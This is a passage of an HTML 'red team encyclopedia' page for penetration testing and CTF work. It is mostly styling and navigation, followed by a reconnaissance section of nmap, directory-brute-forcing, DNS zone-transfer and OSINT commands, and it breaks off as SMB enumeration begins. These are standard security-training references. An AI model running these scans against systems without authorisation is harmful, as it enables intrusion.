@@ -1,0 +1,2621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NIGHT PULSE X — Ultimate Red Team Encyclopedia</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #080c18;
+  --bg2:      #0d1225;
+  --surface:  #111827;
+  --card:     #141d2e;
+  --border:   #1e2d4a;
+  --border2:  #253554;
+  --cyan:     #00d4ff;
+  --cyan2:    #00aacc;
+  --purple:   #7c3aed;
+  --purple2:  #a855f7;
+  --red:      #ff3864;
+  --green:    #00ff88;
+  --orange:   #ff9500;
+  --yellow:   #ffd60a;
+  --text:     #e2e8f0;
+  --text2:    #94a3b8;
+  --text3:    #4a6080;
+  --mono:     'JetBrains Mono', monospace;
+  --sans:     'Inter', sans-serif;
+  --display:  'Space Grotesk', sans-serif;
+  --sidebar:  280px;
+  --radius:   8px;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.6;
+  overflow-x: hidden;
+}
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--cyan2); }
+
+/* ═══════════════════════════════════
+   HEADER
+═══════════════════════════════════ */
+.header {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  height: 56px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 20px;
+  gap: 20px;
+  z-index: 100;
+  overflow: hidden;
+}
+
+.header::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,212,255,0.015) 2px,
+    rgba(0,212,255,0.015) 4px
+  );
+  pointer-events: none;
+}
+
+.logo {
+  font-family: var(--display);
+  font-size: 16px;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  color: var(--cyan);
+  white-space: nowrap;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.logo-dot {
+  width: 8px; height: 8px;
+  background: var(--red);
+  border-radius: 50%;
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.4; transform: scale(0.7); }
+}
+
+.header-search {
+  flex: 1;
+  max-width: 480px;
+  position: relative;
+}
+
+.header-search input {
+  width: 100%;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 7px 12px 7px 34px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.header-search input:focus { border-color: var(--cyan); }
+.header-search input::placeholder { color: var(--text3); }
+
+.search-icon {
+  position: absolute;
+  left: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text3);
+  font-size: 12px;
+}
+
+.header-badges {
+  display: flex;
+  gap: 8px;
+  margin-left: auto;
+}
+
+.badge {
+  font-family: var(--mono);
+  font-size: 10px;
+  padding: 3px 8px;
+  border-radius: 3px;
+  border: 1px solid;
+  white-space: nowrap;
+}
+
+.badge-red { color: var(--red); border-color: var(--red); background: rgba(255,56,100,0.08); }
+.badge-cyan { color: var(--cyan); border-color: var(--cyan); background: rgba(0,212,255,0.08); }
+.badge-green { color: var(--green); border-color: var(--green); background: rgba(0,255,136,0.08); }
+
+/* ═══════════════════════════════════
+   LAYOUT
+═══════════════════════════════════ */
+.layout {
+  display: flex;
+  padding-top: 56px;
+  min-height: 100vh;
+}
+
+/* ═══════════════════════════════════
+   SIDEBAR
+═══════════════════════════════════ */
+.sidebar {
+  width: var(--sidebar);
+  flex-shrink: 0;
+  position: fixed;
+  top: 56px;
+  left: 0;
+  bottom: 0;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  padding: 16px 0;
+}
+
+.nav-section-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 0.15em;
+  color: var(--text3);
+  padding: 12px 16px 4px;
+  text-transform: uppercase;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 7px 16px;
+  cursor: pointer;
+  color: var(--text2);
+  font-size: 12.5px;
+  font-family: var(--sans);
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+  text-decoration: none;
+}
+
+.nav-item:hover {
+  background: rgba(0,212,255,0.06);
+  color: var(--text);
+  border-left-color: var(--border2);
+}
+
+.nav-item.active {
+  background: rgba(0,212,255,0.1);
+  color: var(--cyan);
+  border-left-color: var(--cyan);
+}
+
+.nav-icon {
+  font-size: 13px;
+  width: 16px;
+  text-align: center;
+  flex-shrink: 0;
+}
+
+.nav-count {
+  margin-left: auto;
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--text3);
+  background: var(--surface);
+  padding: 1px 6px;
+  border-radius: 10px;
+}
+
+/* ═══════════════════════════════════
+   MAIN CONTENT
+═══════════════════════════════════ */
+.main {
+  margin-left: var(--sidebar);
+  flex: 1;
+  padding: 32px;
+  max-width: calc(100vw - var(--sidebar));
+}
+
+/* ═══════════════════════════════════
+   HERO
+═══════════════════════════════════ */
+.hero {
+  position: relative;
+  padding: 48px 0 40px;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 40px;
+  overflow: hidden;
+}
+
+.hero::after {
+  content: '';
+  position: absolute;
+  top: 0; right: -100px;
+  width: 500px; height: 200px;
+  background: radial-gradient(ellipse, rgba(124,58,237,0.12) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--cyan);
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.hero-eyebrow::before {
+  content: '';
+  display: inline-block;
+  width: 24px;
+  height: 1px;
+  background: var(--cyan);
+}
+
+.hero-title {
+  font-family: var(--display);
+  font-size: clamp(28px, 4vw, 48px);
+  font-weight: 700;
+  line-height: 1.1;
+  letter-spacing: -0.02em;
+  margin-bottom: 16px;
+}
+
+.hero-title .accent { color: var(--cyan); }
+.hero-title .accent2 { color: var(--purple2); }
+
+.hero-sub {
+  color: var(--text2);
+  font-size: 14px;
+  max-width: 560px;
+  line-height: 1.7;
+  margin-bottom: 24px;
+}
+
+.hero-stats {
+  display: flex;
+  gap: 32px;
+}
+
+.stat {
+  display: flex;
+  flex-direction: column;
+}
+
+.stat-num {
+  font-family: var(--mono);
+  font-size: 24px;
+  font-weight: 700;
+  color: var(--cyan);
+  line-height: 1;
+}
+
+.stat-label {
+  font-size: 11px;
+  color: var(--text3);
+  margin-top: 2px;
+}
+
+/* ═══════════════════════════════════
+   SECTION
+═══════════════════════════════════ */
+.section {
+  margin-bottom: 48px;
+  scroll-margin-top: 80px;
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+.section-icon {
+  width: 32px; height: 32px;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  flex-shrink: 0;
+}
+
+.icon-cyan { background: rgba(0,212,255,0.12); }
+.icon-purple { background: rgba(124,58,237,0.12); }
+.icon-red { background: rgba(255,56,100,0.12); }
+.icon-green { background: rgba(0,255,136,0.12); }
+.icon-orange { background: rgba(255,149,0,0.12); }
+.icon-yellow { background: rgba(255,214,10,0.12); }
+
+.section-title {
+  font-family: var(--display);
+  font-size: 20px;
+  font-weight: 600;
+  letter-spacing: -0.01em;
+}
+
+.section-meta {
+  margin-left: auto;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text3);
+}
+
+/* ═══════════════════════════════════
+   CARDS GRID
+═══════════════════════════════════ */
+.grid { display: grid; gap: 16px; }
+.grid-2 { grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); }
+.grid-3 { grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); }
+.grid-1 { grid-template-columns: 1fr; }
+
+/* ═══════════════════════════════════
+   CARD
+═══════════════════════════════════ */
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 18px;
+  transition: border-color 0.2s;
+}
+
+.card:hover { border-color: var(--border2); }
+
+.card-title {
+  font-family: var(--display);
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 10px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.card-tag {
+  font-family: var(--mono);
+  font-size: 9px;
+  padding: 2px 6px;
+  border-radius: 3px;
+  margin-left: auto;
+}
+
+.tag-critical { background: rgba(255,56,100,0.15); color: var(--red); }
+.tag-high { background: rgba(255,149,0,0.15); color: var(--orange); }
+.tag-medium { background: rgba(255,214,10,0.15); color: var(--yellow); }
+.tag-low { background: rgba(0,255,136,0.15); color: var(--green); }
+.tag-info { background: rgba(0,212,255,0.12); color: var(--cyan); }
+
+/* ═══════════════════════════════════
+   CODE BLOCKS
+═══════════════════════════════════ */
+.code-block {
+  background: #060b14;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  margin: 10px 0;
+  overflow: hidden;
+}
+
+.code-header {
+  display: flex;
+  align-items: center;
+  padding: 6px 12px;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  gap: 8px;
+}
+
+.code-lang {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--cyan);
+  font-weight: 500;
+}
+
+.code-desc {
+  font-size: 11px;
+  color: var(--text3);
+}
+
+.copy-btn {
+  margin-left: auto;
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--text3);
+  background: none;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 2px 8px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+
+.copy-btn:hover { color: var(--cyan); border-color: var(--cyan); }
+
+pre {
+  padding: 14px 16px;
+  overflow-x: auto;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.7;
+  color: #c9d8f0;
+}
+
+.c-comment { color: #4a6080; }
+.c-cmd { color: var(--cyan); }
+.c-flag { color: var(--purple2); }
+.c-string { color: var(--green); }
+.c-var { color: var(--orange); }
+.c-red { color: var(--red); }
+.c-yellow { color: var(--yellow); }
+
+/* ═══════════════════════════════════
+   TABLE
+═══════════════════════════════════ */
+.table-wrap {
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin: 10px 0;
+}
+
+table { width: 100%; border-collapse: collapse; }
+
+th {
+  background: var(--surface);
+  padding: 8px 14px;
+  text-align: left;
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 600;
+  color: var(--text3);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  border-bottom: 1px solid var(--border);
+}
+
+td {
+  padding: 8px 14px;
+  font-size: 12.5px;
+  border-bottom: 1px solid rgba(30,45,74,0.5);
+  vertical-align: top;
+}
+
+td:first-child { font-family: var(--mono); font-size: 12px; color: var(--cyan); }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: rgba(0,212,255,0.03); }
+
+/* ═══════════════════════════════════
+   STEPS / METHODOLOGY
+═══════════════════════════════════ */
+.steps { display: flex; flex-direction: column; gap: 0; }
+
+.step {
+  display: flex;
+  gap: 16px;
+  padding: 16px 0;
+  border-bottom: 1px solid rgba(30,45,74,0.5);
+  position: relative;
+}
+
+.step:last-child { border-bottom: none; }
+
+.step-num {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--bg);
+  background: var(--cyan);
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+
+.step-body { flex: 1; }
+
+.step-title {
+  font-family: var(--display);
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+
+.step-desc {
+  color: var(--text2);
+  font-size: 12.5px;
+  line-height: 1.6;
+}
+
+/* ═══════════════════════════════════
+   ACCORDION
+═══════════════════════════════════ */
+.accordion { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; margin: 8px 0; }
+
+.accordion-header {
+  display: flex;
+  align-items: center;
+  padding: 12px 16px;
+  cursor: pointer;
+  background: var(--card);
+  gap: 10px;
+  user-select: none;
+  transition: background 0.15s;
+}
+
+.accordion-header:hover { background: var(--surface); }
+
+.accordion-title {
+  font-family: var(--display);
+  font-size: 13px;
+  font-weight: 500;
+  flex: 1;
+}
+
+.accordion-arrow {
+  color: var(--text3);
+  font-size: 11px;
+  transition: transform 0.2s;
+}
+
+.accordion.open .accordion-arrow { transform: rotate(90deg); }
+
+.accordion-body {
+  display: none;
+  padding: 16px;
+  background: #0a0f1e;
+  border-top: 1px solid var(--border);
+}
+
+.accordion.open .accordion-body { display: block; }
+
+/* ═══════════════════════════════════
+   PILL TAGS
+═══════════════════════════════════ */
+.pill-group { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+
+.pill {
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 20px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  color: var(--text2);
+}
+
+.pill-cyan { border-color: rgba(0,212,255,0.3); color: var(--cyan); background: rgba(0,212,255,0.06); }
+.pill-purple { border-color: rgba(168,85,247,0.3); color: var(--purple2); background: rgba(168,85,247,0.06); }
+.pill-red { border-color: rgba(255,56,100,0.3); color: var(--red); background: rgba(255,56,100,0.06); }
+.pill-green { border-color: rgba(0,255,136,0.3); color: var(--green); background: rgba(0,255,136,0.06); }
+
+/* ═══════════════════════════════════
+   ALERT BOXES
+═══════════════════════════════════ */
+.alert {
+  display: flex;
+  gap: 12px;
+  padding: 12px 14px;
+  border-radius: var(--radius);
+  border-left: 3px solid;
+  margin: 10px 0;
+  font-size: 12.5px;
+}
+
+.alert-icon { font-size: 14px; flex-shrink: 0; margin-top: 1px; }
+.alert-body { flex: 1; }
+.alert-title { font-weight: 600; margin-bottom: 2px; font-size: 12px; }
+
+.alert-warning { background: rgba(255,149,0,0.07); border-color: var(--orange); }
+.alert-warning .alert-title { color: var(--orange); }
+.alert-danger { background: rgba(255,56,100,0.07); border-color: var(--red); }
+.alert-danger .alert-title { color: var(--red); }
+.alert-tip { background: rgba(0,212,255,0.07); border-color: var(--cyan); }
+.alert-tip .alert-title { color: var(--cyan); }
+.alert-success { background: rgba(0,255,136,0.07); border-color: var(--green); }
+.alert-success .alert-title { color: var(--green); }
+
+/* ═══════════════════════════════════
+   SEARCH RESULTS
+═══════════════════════════════════ */
+.search-results {
+  display: none;
+  position: absolute;
+  top: calc(100% + 4px);
+  left: 0; right: 0;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  max-height: 300px;
+  overflow-y: auto;
+  z-index: 200;
+}
+
+.search-result-item {
+  padding: 10px 14px;
+  cursor: pointer;
+  border-bottom: 1px solid rgba(30,45,74,0.5);
+  transition: background 0.1s;
+}
+
+.search-result-item:hover { background: rgba(0,212,255,0.08); }
+.search-result-item:last-child { border-bottom: none; }
+.search-result-title { font-size: 12.5px; font-weight: 500; }
+.search-result-section { font-family: var(--mono); font-size: 10px; color: var(--text3); margin-top: 2px; }
+
+/* ═══════════════════════════════════
+   HIGHLIGHT
+═══════════════════════════════════ */
+.hl { color: var(--cyan); font-weight: 600; }
+.hl-red { color: var(--red); font-weight: 600; }
+.hl-green { color: var(--green); font-weight: 600; }
+.hl-orange { color: var(--orange); font-weight: 600; }
+.hl-purple { color: var(--purple2); font-weight: 600; }
+
+p { color: var(--text2); line-height: 1.7; margin-bottom: 10px; font-size: 13px; }
+ul, ol { color: var(--text2); padding-left: 20px; margin-bottom: 10px; font-size: 13px; }
+li { margin-bottom: 4px; line-height: 1.6; }
+h3 { font-family: var(--display); font-size: 15px; font-weight: 600; margin: 16px 0 8px; color: var(--text); }
+h4 { font-family: var(--mono); font-size: 12px; font-weight: 600; color: var(--cyan); margin: 12px 0 6px; text-transform: uppercase; letter-spacing: 0.08em; }
+
+.divider { height: 1px; background: var(--border); margin: 24px 0; }
+
+/* ═══════════════════════════════════
+   TERMINAL WINDOW
+═══════════════════════════════════ */
+.terminal {
+  background: #030609;
+  border: 1px solid #1a2540;
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin: 10px 0;
+}
+
+.terminal-bar {
+  background: #0d1420;
+  padding: 8px 12px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  border-bottom: 1px solid #1a2540;
+}
+
+.t-btn { width: 10px; height: 10px; border-radius: 50%; }
+.t-red { background: #ff5f57; }
+.t-yellow { background: #febc2e; }
+.t-green { background: #28c840; }
+.t-label { font-family: var(--mono); font-size: 11px; color: #4a6080; margin-left: auto; }
+
+.terminal pre {
+  padding: 14px 16px;
+  font-size: 12px;
+  line-height: 1.8;
+  color: #8fbcbb;
+}
+
+.t-prompt { color: #88c0d0; }
+.t-cmd-text { color: #eceff4; }
+.t-output { color: #616e88; }
+.t-success { color: #a3be8c; }
+.t-error { color: #bf616a; }
+.t-warn { color: #ebcb8b; }
+.t-cyan { color: #88c0d0; }
+
+/* ═══════════════════════════════════
+   QUICK REF TABLE
+═══════════════════════════════════ */
+.qr-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 8px;
+  margin: 10px 0;
+}
+
+.qr-item {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 10px;
+}
+
+.qr-port { font-family: var(--mono); font-size: 16px; font-weight: 700; color: var(--cyan); }
+.qr-service { font-size: 12px; color: var(--text2); margin-top: 2px; }
+.qr-note { font-size: 11px; color: var(--text3); margin-top: 4px; font-family: var(--mono); }
+
+/* ═══════════════════════════════════
+   PROGRESS BAR
+═══════════════════════════════════ */
+.progress-item { margin-bottom: 12px; }
+.progress-label { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 4px; }
+.progress-bar { height: 4px; background: var(--surface); border-radius: 2px; overflow: hidden; }
+.progress-fill { height: 100%; border-radius: 2px; transition: width 0.5s; }
+
+/* ═══════════════════════════════════
+   RESPONSIVE
+═══════════════════════════════════ */
+@media (max-width: 900px) {
+  .sidebar { transform: translateX(-100%); }
+  .main { margin-left: 0; }
+  :root { --sidebar: 0px; }
+}
+
+/* Search highlight */
+.search-highlight { background: rgba(0,212,255,0.2); color: var(--cyan); border-radius: 2px; padding: 0 2px; }
+
+/* ═══════════════════════════════════
+   HIDDEN sections for search
+═══════════════════════════════════ */
+.searchable { transition: opacity 0.2s; }
+.searchable.hidden { display: none; }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════ HEADER ═══════════════════════ -->
+<header class="header">
+  <div class="logo">
+    <div class="logo-dot"></div>
+    NIGHT PULSE X
+  </div>
+  <div class="header-search">
+    <span class="search-icon">⌕</span>
+    <input type="text" id="globalSearch" placeholder="Search techniques, tools, payloads..." autocomplete="off">
+    <div class="search-results" id="searchResults"></div>
+  </div>
+  <div class="header-badges">
+    <span class="badge badge-red">RED TEAM</span>
+    <span class="badge badge-cyan">v3.0</span>
+    <span class="badge badge-green">HTB READY</span>
+  </div>
+</header>
+
+<!-- ═══════════════════════ SIDEBAR ═══════════════════════ -->
+<nav class="sidebar">
+  <div class="nav-section-label">Navigation</div>
+  <a class="nav-item active" href="#overview"><span class="nav-icon">◈</span> Overview</a>
+
+  <div class="nav-section-label">Methodology</div>
+  <a class="nav-item" href="#recon"><span class="nav-icon">◉</span> Reconnaissance <span class="nav-count">12</span></a>
+  <a class="nav-item" href="#enum"><span class="nav-icon">◈</span> Enumeration <span class="nav-count">18</span></a>
+  <a class="nav-item" href="#vuln"><span class="nav-icon">◇</span> Vulnerability Analysis</a>
+  <a class="nav-item" href="#exploit"><span class="nav-icon">◆</span> Exploitation <span class="nav-count">24</span></a>
+  <a class="nav-item" href="#postexploit"><span class="nav-icon">▣</span> Post-Exploitation</a>
+
+  <div class="nav-section-label">Web Attacks</div>
+  <a class="nav-item" href="#web-sqli"><span class="nav-icon">⬡</span> SQL Injection</a>
+  <a class="nav-item" href="#web-xss"><span class="nav-icon">⬡</span> XSS</a>
+  <a class="nav-item" href="#web-ssti"><span class="nav-icon">⬡</span> SSTI</a>
+  <a class="nav-item" href="#web-lfi"><span class="nav-icon">⬡</span> LFI / Path Traversal</a>
+  <a class="nav-item" href="#web-rce"><span class="nav-icon">⬡</span> RCE / Command Injection</a>
+  <a class="nav-item" href="#web-other"><span class="nav-icon">⬡</span> SSRF / XXE / Other</a>
+
+  <div class="nav-section-label">Active Directory</div>
+  <a class="nav-item" href="#ad-enum"><span class="nav-icon">▤</span> AD Enumeration</a>
+  <a class="nav-item" href="#ad-kerberos"><span class="nav-icon">▤</span> Kerberos Attacks</a>
+  <a class="nav-item" href="#ad-lateral"><span class="nav-icon">▤</span> Lateral Movement</a>
+  <a class="nav-item" href="#ad-adcs"><span class="nav-icon">▤</span> AD CS Attacks</a>
+  <a class="nav-item" href="#ad-dpapi"><span class="nav-icon">▤</span> DPAPI</a>
+
+  <div class="nav-section-label">Privilege Escalation</div>
+  <a class="nav-item" href="#privesc-linux"><span class="nav-icon">▲</span> Linux PrivEsc</a>
+  <a class="nav-item" href="#privesc-windows"><span class="nav-icon">▲</span> Windows PrivEsc</a>
+
+  <div class="nav-section-label">Post Exploitation</div>
+  <a class="nav-item" href="#shells"><span class="nav-icon">◎</span> Shells & Pivoting</a>
+  <a class="nav-item" href="#creds"><span class="nav-icon">◎</span> Credential Dumping</a>
+  <a class="nav-item" href="#persistence"><span class="nav-icon">◎</span> Persistence</a>
+
+  <div class="nav-section-label">Reference</div>
+  <a class="nav-item" href="#ports"><span class="nav-icon">▸</span> Ports & Services</a>
+  <a class="nav-item" href="#tools"><span class="nav-icon">▸</span> Tools Cheatsheet</a>
+  <a class="nav-item" href="#payloads"><span class="nav-icon">▸</span> Payload Library</a>
+  <a class="nav-item" href="#wordlists"><span class="nav-icon">▸</span> Wordlists</a>
+</nav>
+
+<!-- ═══════════════════════ MAIN ═══════════════════════ -->
+<main class="main">
+
+<!-- HERO -->
+<div id="overview" class="hero">
+  <div class="hero-eyebrow">Ultimate Red Team Encyclopedia</div>
+  <h1 class="hero-title">
+    <span class="accent">NIGHT</span> PULSE <span class="accent2">X</span><br>
+    Red Team Bible
+  </h1>
+  <p class="hero-sub">Complete reference for penetration testing, CTF, and red team operations. Covers recon → exploitation → privilege escalation → persistence for Linux, Windows, and Active Directory environments.</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-num">200+</span><span class="stat-label">Techniques</span></div>
+    <div class="stat"><span class="stat-num">150+</span><span class="stat-label">Commands</span></div>
+    <div class="stat"><span class="stat-num">12</span><span class="stat-label">Attack Chains</span></div>
+    <div class="stat"><span class="stat-num">∞</span><span class="stat-label">Payloads</span></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 1: RECONNAISSANCE
+══════════════════════════════════════════════ -->
+<section id="recon" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-cyan">◉</div>
+    <div class="section-title">Reconnaissance</div>
+    <div class="section-meta">PHASE 1</div>
+  </div>
+
+  <div class="grid grid-2">
+    <!-- Nmap -->
+    <div class="card searchable">
+      <div class="card-title">🔍 Nmap — Port Scanning <span class="card-tag tag-info">ESSENTIAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Quick → Full → Scripts</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Fast initial scan</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sV -sC -T4</span> <span class="c-var">$IP</span> <span class="c-flag">-oN</span> scan.txt
+
+<span class="c-comment"># All ports</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-p-</span> <span class="c-flag">--min-rate 5000 -T4</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># Full with scripts on found ports</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sV -sC -A -p</span> <span class="c-var">22,80,443,8080</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># UDP top 100</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">-sU --top-ports 100</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># Vulnerability scan</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script vuln</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># SMB enumeration</span>
+<span class="c-cmd">nmap</span> <span class="c-flag">--script smb-enum-shares,smb-enum-users</span> <span class="c-var">$IP</span></pre>
+      </div>
+    </div>
+
+    <!-- Web Recon -->
+    <div class="card searchable">
+      <div class="card-title">🌐 Web Discovery <span class="card-tag tag-info">WEB</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Directories & Subdomains</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># gobuster directories</span>
+<span class="c-cmd">gobuster dir</span> <span class="c-flag">-u</span> http://<span class="c-var">$IP</span> <span class="c-flag">-w</span> /usr/share/wordlists/dirb/common.txt <span class="c-flag">-x</span> php,html,txt <span class="c-flag">-t</span> 40
+
+<span class="c-comment"># ffuf subdomains</span>
+<span class="c-cmd">ffuf</span> <span class="c-flag">-w</span> subdomains-top1m-5000.txt <span class="c-flag">-u</span> http://FUZZ.<span class="c-var">$DOMAIN</span> <span class="c-flag">-fs</span> 0
+
+<span class="c-comment"># feroxbuster recursive</span>
+<span class="c-cmd">feroxbuster</span> <span class="c-flag">-u</span> http://<span class="c-var">$IP</span> <span class="c-flag">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="c-flag">-x</span> php,html,txt,js <span class="c-flag">--depth</span> 3
+
+<span class="c-comment"># Check robots.txt, sitemap</span>
+<span class="c-cmd">curl</span> <span class="c-flag">-s</span> http://<span class="c-var">$IP</span>/robots.txt
+<span class="c-cmd">curl</span> <span class="c-flag">-s</span> http://<span class="c-var">$IP</span>/sitemap.xml</pre>
+      </div>
+    </div>
+
+    <!-- DNS -->
+    <div class="card searchable">
+      <div class="card-title">🔎 DNS Enumeration <span class="card-tag tag-info">DNS</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Zone transfer</span>
+<span class="c-cmd">dig axfr</span> <span class="c-var">$DOMAIN</span> @<span class="c-var">$IP</span>
+
+<span class="c-comment"># dnsenum</span>
+<span class="c-cmd">dnsenum</span> <span class="c-flag">--dnsserver</span> <span class="c-var">$IP</span> <span class="c-flag">-f</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="c-var">$DOMAIN</span>
+
+<span class="c-comment"># dnsrecon</span>
+<span class="c-cmd">dnsrecon</span> <span class="c-flag">-d</span> <span class="c-var">$DOMAIN</span> <span class="c-flag">-t</span> axfr
+
+<span class="c-comment"># wfuzz virtual hosts</span>
+<span class="c-cmd">wfuzz</span> <span class="c-flag">-c -w</span> subdomains.txt <span class="c-flag">-H</span> <span class="c-string">"Host: FUZZ.$DOMAIN"</span> http://<span class="c-var">$IP</span></pre>
+      </div>
+    </div>
+
+    <!-- OSINT -->
+    <div class="card searchable">
+      <div class="card-title">🕵️ OSINT & Passive Recon</div>
+      <div class="pill-group">
+        <span class="pill pill-cyan">Shodan</span>
+        <span class="pill pill-cyan">theHarvester</span>
+        <span class="pill pill-cyan">Maltego</span>
+        <span class="pill pill-purple">wayback</span>
+        <span class="pill pill-purple">crt.sh</span>
+        <span class="pill pill-green">whois</span>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># theHarvester</span>
+<span class="c-cmd">theHarvester</span> <span class="c-flag">-d</span> <span class="c-var">$DOMAIN</span> <span class="c-flag">-b</span> all <span class="c-flag">-l</span> 500
+
+<span class="c-comment"># Certificate transparency</span>
+<span class="c-cmd">curl</span> <span class="c-flag">-s</span> <span class="c-string">"https://crt.sh/?q=%.$DOMAIN&output=json"</span> | <span class="c-cmd">jq</span> <span class="c-flag">-r</span> <span class="c-string">'.[].name_value'</span> | sort <span class="c-flag">-u</span>
+
+<span class="c-comment"># Wayback URLs</span>
+<span class="c-cmd">waybackurls</span> <span class="c-var">$DOMAIN</span> | sort <span class="c-flag">-u</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 2: ENUMERATION
+══════════════════════════════════════════════ -->
+<section id="enum" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-purple">◈</div>
+    <div class="section-title">Enumeration</div>
+    <div class="section-meta">PHASE 2</div>
+  </div>
+
+  <div class="grid grid-2">
+    <!-- SMB -->
+    <div class="card searchable">
+      <div class="card-title">📁 SMB Enumeration <span class="card-tag tag-high">PORT 445</span></div>
+      <div class="code-block">
